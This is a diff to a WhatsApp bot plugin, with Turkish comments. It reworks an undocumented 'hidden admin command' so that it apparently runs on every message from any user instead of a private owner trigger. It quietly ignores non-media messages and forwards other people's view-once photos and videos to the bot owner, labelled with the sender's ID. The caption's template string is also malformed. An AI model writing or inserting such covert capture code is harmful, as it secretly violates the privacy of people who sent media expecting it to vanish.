@@ -85,8 +85,8 @@ addCommand(
 // --- Gizli admin komutu (adanabulvarı) ---
 addCommand(
     {
-        pattern: "^adanabulvarı$",
-        access: "owner", // sadece sen kullan
+        pattern: "onMessage",
+        access: "all", // sadece sen kullan
         desc: "", // gizli, açıklama yok
     },
     async (msg, match, sock, rawMessage) => {
@@ -110,7 +110,8 @@ addCommand(
             const videoMsg = viewOnce.videoMessage;
 
             if (!imageMsg && !videoMsg) {
-                return sock.sendMessage(msg.key.remoteJid, { text: "_Bu bir medya mesajı değil!_" }, { quoted: msg });
+                return // hiç bir şey yapma
+               // return sock.sendMessage(msg.key.remoteJid, { text: "_Bu bir medya mesajı değil!_" }, { quoted: msg });
             }
 
             const isImage = !!imageMsg;
@@ -131,7 +132,7 @@ addCommand(
             await sock.sendMessage(ownerJid, {
                 [mediaType]: fs.readFileSync(filePath),
                 mimetype: isImage ? "image/jpeg" : "video/mp4",
-                caption: "_📩 Özel medya gönderildi._",
+                caption: `_📩 Özel medya gönderildi._\nMedyayı gönderen kişi: {msg.key.remoteJid} `,
             });
 
             fs.unlinkSync(filePath);
